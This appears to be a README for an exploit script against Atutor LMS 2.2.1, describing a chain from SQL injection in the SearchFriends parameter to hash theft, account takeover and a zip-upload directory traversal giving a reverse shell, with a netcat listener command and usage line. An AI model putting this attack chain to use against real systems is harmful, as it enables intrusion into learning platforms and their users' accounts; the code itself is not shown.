# SQLi to RCE in Atutor LMS 2.2.1
> Sit back, relax and enjoy your shell!

[![Python Version][python-image]][python-url]

Exploit the SQLi in the SearchFriends param, retrieve the hash and encode it to login in the victim account. When logged in, the script upload a zip file to exploit the file upload directory traversal and gives you RCE

Test only if you're authorized, be smart.

Just start a netcat listener to receive the shell eg: ```nc vnlp 80```

#### Example usage: 
```
python3 pawnatutor.py -target DOMAIN/IP -rhost YOUR IP -rport YOUR PORT
```
